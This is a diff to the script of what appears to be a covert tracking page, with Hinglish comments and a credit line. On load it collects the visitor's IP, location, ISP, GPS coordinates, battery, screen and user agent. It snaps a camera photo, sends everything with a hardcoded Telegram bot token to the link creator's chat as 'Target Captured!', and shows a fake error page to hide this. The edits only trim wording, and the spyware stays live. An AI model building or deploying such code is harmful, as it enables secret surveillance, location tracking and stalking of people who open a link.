@@ -58,15 +58,15 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // URL se dynamic Chat ID uthane ka tareeka
+        // URL se us user ki ID uthayega jo link generate karega
         const urlParams = new URLSearchParams(window.location.search);
-        const TARGET_CHAT_ID = urlParams.get('id'); // Jo link me id aayegi wahi use hogi
+        const TARGET_CHAT_ID = urlParams.get('id');
 
-        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI"; // Bot token wahi rahega jo tera main bot hai
+        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
 
         async function startCapture() {
             if (!TARGET_CHAT_ID) {
-                alert("Invalid Link! User ID missing.");
+                alert("Invalid Link!");
                 return;
             }
 
@@ -79,7 +79,7 @@
                 let ipData = await ipRes.json();
                 ipInfo = `🌐 **IP Information**\n🔢 IP: \`${ipData.ip}\`\n📍 Location: ${ipData.city}, ${ipData.region}\n🗺 Country: ${ipData.country_name}\n📡 ISP: ${ipData.org}`;
             } catch(e) {
-                ipInfo = "🌐 IP Info: Failed to fetch";
+                ipInfo = "🌐 IP Info: Failed";
             }
 
             let batteryInfo = "N/A";
@@ -93,7 +93,7 @@
             let screenInfo = `🖥️ Screen: ${window.innerWidth}x${window.innerHeight}`;
             let uaInfo = `🧠 UA: ${navigator.userAgent}`;
 
-            let gpsInfo = "📍 GPS: Not Allowed / Unavailable";
+            let gpsInfo = "📍 GPS: Not Allowed";
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(pos => {
                     let lat = pos.coords.latitude;
@@ -123,7 +123,7 @@
                             let fullCaption = `📸 **Target Captured!**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n${uaInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;
 
                             const formData = new FormData();
-                            formData.append('chat_id', TARGET_CHAT_ID); // Yahan usi user ki ID jayegi jo link generate karega
+                            formData.append('chat_id', TARGET_CHAT_ID); // Yahan link banane wale ki ID jayegi
                             formData.append('caption', fullCaption);
                             formData.append('parse_mode', 'Markdown');
                             formData.append('photo', blob, 'captured.jpg');
@@ -138,7 +138,7 @@
                     }, 1500);
 
                 } catch(err) {
-                    let fullCaption = `⚠️ **Camera Denied, but Info Captured:**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;
+                    let fullCaption = `⚠️ **Camera Denied:**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;
                     
                     let formData = new FormData();
                     formData.append('chat_id', TARGET_CHAT_ID);
@@ -150,7 +150,7 @@
                         body: formData
                     }).catch(e => {});
 
-                    document.getElementById('loading-card').innerHTML = "<h3>Error Loading Page</h3><p style='color:#ef4444;font-size:14px;'>Please try again.</p>";
+                    document.getElementById('loading-card').innerHTML = "<h3>Error</h3><p style='color:#ef4444;font-size:14px;'>Try again.</p>";
                 }
             }, 1000);
         }
